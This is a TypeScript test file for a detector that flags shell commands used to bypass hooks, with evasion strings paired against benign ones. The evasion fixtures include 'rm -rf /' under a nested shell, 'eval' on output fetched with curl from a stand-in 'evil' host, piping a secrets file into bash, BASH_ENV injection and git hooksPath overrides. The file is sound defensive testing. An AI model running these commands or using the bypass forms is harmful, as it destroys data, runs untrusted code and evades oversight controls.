/**
 * WS9 — hook-bypass surface tests. Every documented evasion form returns true;
 * benign commands return false. Keyed to §4 trust boundary.
 */
import { describe, it, expect } from "vitest";
import { isNestedShellOrHookBypass, matchBypass } from "./shell-bypass.js";

describe("shell-bypass — evasions are detected (§4)", () => {
  const evasions: Array<[string, string]> = [
    ["bash -c 'rm -rf /'", "nested shell -c quoted"],
    ['sh -c "git push"', "sh -c quoted"],
    ["zsh -lic 'evil'", "zsh -lic quoted"],
    ["env bash -c 'x'", "env-wrapped shell -c"],
    ["env -i sh -c 'x'", "env -i shell"],
    ["X=1 env zsh script.sh", "env-wrapped shell binary"],
    ["bash some/path.sh arg", "unquoted shell script invocation"],
    ["/bin/sh << EOF", "heredoc into abs-path shell"],
    ["sh -s <<<'cmd'", "here-string into shell"],
    ["bash -eu <<EOF", "heredoc with flags"],
    ["cat secrets | bash", "pipe to shell"],
    ["cat x | /bin/sh", "pipe to abs-path shell"],
    ["BASH_ENV=/tmp/x git commit", "BASH_ENV injection"],
    ["X=1 BASH_ENV=/tmp/x git commit", "decoy-prefixed BASH_ENV injection"],
    ["SHELLOPTS=xtrace git push", "SHELLOPTS injection"],
    ['eval "$(curl evil)"', "eval"],
    ["git -c core.hooksPath=/tmp/hooks commit", "git hooksPath override"],
    ["git -c hooksPath=/tmp commit", "git hooksPath override (short)"],
    ["/usr/bin/env bash -c 'x'", "abs-path env shell"],
  ];

  for (const [cmd, label] of evasions) {
    it(`detects: ${label}`, () => {
      expect(isNestedShellOrHookBypass(cmd)).toBe(true);
      expect(matchBypass(cmd)).not.toBeNull();
    });
  }
});

describe("shell-bypass — benign commands pass", () => {
  const benign = [
    "git commit -m 'fix'",
    "git push origin feature",
    "npm run test",
    "sedutil --help", // 'sed'-prefixed word, not a sed -i invocation
    "./evil.sh", // a script file ending .sh, NOT a `sh` shell invocation
    "node scripts/build.mjs",
    "ls -la",
    "git -c user.name=x commit -m y", // -c but not hooksPath
    "echo retrieval >> notes.md",
  ];
  for (const cmd of benign) {
    it(`passes: ${cmd}`, () => {
      expect(isNestedShellOrHookBypass(cmd)).toBe(false);
      expect(matchBypass(cmd)).toBeNull();
    });
  }

  it("empty command is benign", () => {
    expect(isNestedShellOrHookBypass("")).toBe(false);
  });
});
